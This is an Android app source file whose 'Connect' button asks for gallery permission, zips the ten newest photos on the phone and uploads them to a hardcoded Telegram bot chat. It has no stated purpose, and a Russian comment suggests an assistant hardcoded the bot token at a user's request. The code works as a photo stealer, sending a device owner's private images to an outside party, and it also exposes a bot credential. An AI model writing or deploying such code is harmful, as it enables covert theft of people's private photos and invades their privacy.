package com.example.galggg;

import android.Manifest;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int REQ_PERMS = 100;

    // ДЕМО: захардкожено по вашей просьбе (для реального кода вынесите в BuildConfig)
    private static final String BOT_TOKEN = "8444896156:AAHn2ATVHXs1JN9WuARqSTW4pSaYgzu2X0M";
    private static final String CHAT_ID = "462656683";

    private TextView tvStatus;
    private Button btnConnect;
    private ProgressBar progress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tvStatus);
        btnConnect = findViewById(R.id.btnConnect);
        progress = findViewById(R.id.progress);

        btnConnect.setOnClickListener(v -> startFlow());
    }

    private void startFlow() {
        if (hasImagePermission()) {
            new ZipAndSendTask().execute();
        } else {
            requestImagePermission();
        }
    }

    private boolean hasImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES},
                    REQ_PERMS
            );
        } else {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQ_PERMS
            );
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMS && grantResults.length > 0
                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            new ZipAndSendTask().execute();
        } else {
            tvStatus.setText("Разрешение не предоставлено");
            Log.e(TAG, "Permission denied");
        }
    }

    private ArrayList<ImageItem> getLastImages(int count) {
        ArrayList<ImageItem> items = new ArrayList<>();

        String[] projection = new String[] {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };

        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sort
        )) {
            if (cursor != null) {
                int idxId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

                while (cursor.moveToNext() && items.size() < count) {
                    long id = cursor.getLong(idxId);
                    String name = cursor.getString(idxName);
                    if (name == null || name.trim().isEmpty()) {
                        name = "image_" + id + ".jpg";
                    }
                    Uri uri = ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    items.add(new ImageItem(uri, name));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getLastImages error", e);
        }
        return items;
    }

    private static class ImageItem {
        final Uri uri;
        final String displayName;

        ImageItem(Uri uri, String displayName) {
            this.uri = uri;
            this.displayName = displayName;
        }
    }

    @SuppressWarnings("deprecation")
    private class ZipAndSendTask extends AsyncTask<Void, Integer, String> {

        @Override
        protected void onPreExecute() {
            btnConnect.setEnabled(false);
            progress.setVisibility(View.VISIBLE);
            tvStatus.setText("Готовим сжатие и отправку...");
        }

        @Override
        protected String doInBackground(Void... voids) {
            try {
                ArrayList<ImageItem> items = getLastImages(10);
                if (items.isEmpty()) {
                    return "В медиатеке нет изображений";
                }

                File zipFile = new File(getCacheDir(), "latest_photos.zip");
                makeCompressedZip(items, zipFile);

                boolean ok = sendFileToTelegram(zipFile);
                return ok ? "Отправлено успешно" : "Ошибка при отправке";

            } catch (Exception e) {
                Log.e(TAG, "ZipAndSendTask error", e);
                return "Ошибка: " + e.getMessage();
            }
        }

        @Override
        protected void onPostExecute(String result) {
            progress.setVisibility(View.GONE);
            btnConnect.setEnabled(true);
            tvStatus.setText(result);
        }

        private void makeCompressedZip(ArrayList<ImageItem> items, File zipOutFile) throws Exception {
            if (zipOutFile.exists()) zipOutFile.delete();

            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOutFile))) {
                int i = 0;
                for (ImageItem item : items) {
                    i++;
                    publishProgress(i, items.size());

                    BitmapFactory.Options bounds = new BitmapFactory.Options();
                    bounds.inJustDecodeBounds = true;
                    try (InputStream probe = getContentResolver().openInputStream(item.uri)) {
                        if (probe != null) {
                            BitmapFactory.decodeStream(probe, null, bounds);
                        }
                    }

                    int reqMaxSide = 1600;
                    int inSample = calcInSample(bounds.outWidth, bounds.outHeight, reqMaxSide);
                    BitmapFactory.Options opts = new BitmapFactory.Options();
                    opts.inSampleSize = inSample;

                    Bitmap bitmap;
                    try (InputStream source = getContentResolver().openInputStream(item.uri)) {
                        if (source == null) continue;
                        bitmap = BitmapFactory.decodeStream(source, null, opts);
                    }

                    if (bitmap == null) continue;

                    int w = bitmap.getWidth();
                    int h = bitmap.getHeight();
                    int maxSide = Math.max(w, h);
                    if (maxSide > reqMaxSide) {
                        float scale = reqMaxSide / (float) maxSide;
                        int nw = Math.round(w * scale);
                        int nh = Math.round(h * scale);
                        bitmap = Bitmap.createScaledBitmap(bitmap, nw, nh, true);
                    }

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                    byte[] data = baos.toByteArray();
                    baos.close();
                    bitmap.recycle();

                    String entryName = item.displayName;
                    String lower = entryName.toLowerCase();
                    if (!lower.endsWith(".jpg") && !lower.endsWith(".jpeg")) {
                        entryName = entryName + ".jpg";
                    }

                    ZipEntry entry = new ZipEntry(entryName);
                    zos.putNextEntry(entry);
                    zos.write(data);
                    zos.closeEntry();
                }
            }
        }

        private int calcInSample(int width, int height, int reqMaxSide) {
            if (width <= 0 || height <= 0) return 1;
            int largest = Math.max(width, height);
            int sample = 1;
            while (largest / sample > reqMaxSide) {
                sample *= 2;
            }
            return Math.max(sample, 1);
        }

        private boolean sendFileToTelegram(File file) {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .writeTimeout(120, TimeUnit.SECONDS)
                    .readTimeout(120, TimeUnit.SECONDS)
                    .build();

            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart(
                            "document",
                            file.getName(),
                            RequestBody.create(file, MediaType.parse("application/zip"))
                    )
                    .build();

            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                boolean ok = response.isSuccessful();
                if (!ok) {
                    Log.e(TAG, "Telegram error: " + response.code() + " " + response.message());
                } else {
                    Log.d(TAG, "Telegram uploaded: " + file.getName());
                }
                return ok;
            } catch (Exception e) {
                Log.e(TAG, "Telegram send error", e);
                return false;
            }
        }
    }
}
